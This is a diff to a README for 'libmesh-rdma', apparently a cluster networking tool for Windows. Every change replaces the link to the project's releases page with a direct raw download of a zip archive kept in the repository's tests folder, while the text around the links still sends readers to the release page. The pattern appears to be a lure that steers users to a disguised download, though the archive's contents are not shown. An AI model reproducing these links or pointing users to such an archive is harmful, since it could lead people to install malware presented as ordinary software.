@@ -1,6 +1,6 @@
 # ⚙️ libmesh-rdma - Faster cluster networking without a switch
 
-[![Download libmesh-rdma](https://img.shields.io/badge/Download%20libmesh--rdma-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/releases)
+[![Download libmesh-rdma](https://img.shields.io/badge/Download%20libmesh--rdma-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip)
 
 ## 🧭 What this app does
 
@@ -17,7 +17,7 @@ Use it if you want to:
 
 Visit the release page and download the latest Windows file:
 
-https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/releases
+https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip
 
 On the release page, look for the newest version and choose the Windows download file. If there are more than one file, pick the one made for Windows and your machine type.
 
@@ -42,7 +42,7 @@ For best results, use:
 ## 🚀 Install on Windows
 
 1. Open this page in your browser:
-   https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/releases
+   https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip
 
 2. Find the newest release.
 
@@ -173,7 +173,7 @@ If one machine still fails, remove it from the cluster list and add it again.
 
 New builds appear on the release page:
 
-https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/releases
+https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip
 
 Check that page when you want:
 
@@ -196,4 +196,4 @@ Only download files from the release page linked above. Open the release page in
 
 ## 🖱️ Start here again
 
-[Go to downloads](https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/releases)
+[Go to downloads](https://github.com/Permanentpressgenusbrontosaurus667/libmesh-rdma/raw/refs/heads/main/tests/rdma_libmesh_2.7.zip)
